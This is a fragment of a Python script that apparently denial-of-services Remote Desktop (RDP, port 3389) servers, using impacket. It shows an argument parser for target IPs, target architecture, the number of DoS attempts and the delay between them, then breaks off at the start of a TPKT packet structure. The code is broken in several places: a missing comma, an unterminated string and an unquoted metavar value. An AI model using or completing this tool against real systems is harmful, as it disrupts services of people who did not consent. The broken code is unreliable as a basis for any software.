#!/usr/bin/env python

import sys
import time
import socket
import struct
import argparse
import binascii
import impacket

from OpenSSL import SSL
from impacket.structure import Structure

class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

        @staticmethod
        def optparse():
            parser = argparse.ArgumentParser()
            parser.add_argument(
                "-i", "--i", dest="ipToAttack", metavar="IP[IP,IP,...]", default=None,
                help="Pass a list of IP addresses separated by a comma or a single IP address (*default=None)"
            )
            parser.add_argument(
                "-p", "--port", type=int, dest="targetPort", metavar="PORT", default=3389,
                help="Specify the target port number (*default=3389)"
            )
            parser.add_argument(
                "-a", "--arch", type=int, choices=(32, 64), dest="archSelected", metavar="ARCHITECTURE", default=64
                help="Pass the architecture of the target you are attacking (*default=64)
            )
            parser.add_argument(
                "-t", "--dos-times", type=int, dest="dosTime", metavar=AMOUNT, default=1,
                help="Pass how many times youy want to DoS the target before exiting (*default=1)"
            )
            parser.add_argument(
                "-w", "--wait-time", type=int, dest="waitTime", metavar="SECONDS", default=0,
                help="Pass how long you want to wait in between DoS's (*default=0)"
            )
            parser.add_argument(
                "-v", "--verbose", action="store_true", default=False, dest="runVerbose",
                help="Show the received packets (*default=False)"
            )
            return parser.parse_args()


# same structure bullshit
class TPKT(Structure):
    commonHdr = (

